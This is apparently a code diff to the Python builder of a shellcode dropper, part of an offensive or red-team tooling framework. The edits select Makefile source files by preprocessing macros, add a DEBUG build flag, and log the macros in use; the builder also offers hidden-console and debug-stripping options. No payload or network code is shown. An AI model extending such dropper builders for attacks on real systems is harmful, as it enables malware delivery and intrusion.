@@ -25,15 +25,17 @@ def build_dropper(dropper_config: dict, temp_dir: str = None):
         remove_debug_code("DebugPrintW", temp_dir)
 
     # Step 2: Fill config headers with preprocessing macros and constants
-    #print(f"Shellcode pre-processing flags: {", ".join(dropper_config.get("preprocessing_macros"))}")
+    preprocessing_macros = dropper_config.get("preprocessing_macros", [])
+    print(f"[+] Using preprocessing macros: {', '.join(preprocessing_macros) if preprocessing_macros else 'None'}")
     fill_config_header(dropper_config, temp_dir)
 
-    # Step 3: Construct the Make command
-    set_makefile_source_files(temp_dir)
+    # Step 3: Update Makefile with only required source files based on preprocessing macros
+    set_makefile_source_files(temp_dir, preprocessing_macros)
     hide_console = dropper_config.get('hide_console', None)
     command = ["make", "-f", "./Makefile", "-j10"] + [
         f"OUTPUT_FILE={out_filename}",
         f"HIDE_CONSOLE={"true" if hide_console else "false"}",
+        f"DEBUG={"true" if dropper_config.get("debug", False) else "false"}",
     ]
 
     #print("Running command:", " ".join(command))  # Debugging output
